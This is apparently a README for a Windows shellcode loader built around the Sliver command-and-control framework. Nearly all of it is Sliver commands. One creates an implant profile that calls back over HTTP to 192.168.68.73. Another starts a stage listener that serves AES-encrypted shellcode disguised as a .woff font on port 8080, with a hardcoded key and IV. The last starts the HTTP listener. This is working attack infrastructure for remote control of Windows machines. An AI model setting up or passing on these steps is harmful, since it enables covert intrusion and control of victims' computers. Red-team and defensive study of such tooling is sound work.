# Building
* replace the values in `windows_build.ps1`
* run the powershell script to build for windows (the only place this works right now)

# Sliver steps
```shell
# create the shellcode profile with HTTP as the transport
profiles new --http 192.168.68.73 --format shellcode win-shell-http
# create the stage listener which serves the shellcode as a .woff on port 8080
stage-listener --url http://192.168.68.73:8080 --profile win-shell-http --aes-encrypt-key oPqVTb-ieogwPT94 --aes-encrypt-iv lbzPx4uGUpAx7Wap
# start the http listener for the http connection
http
```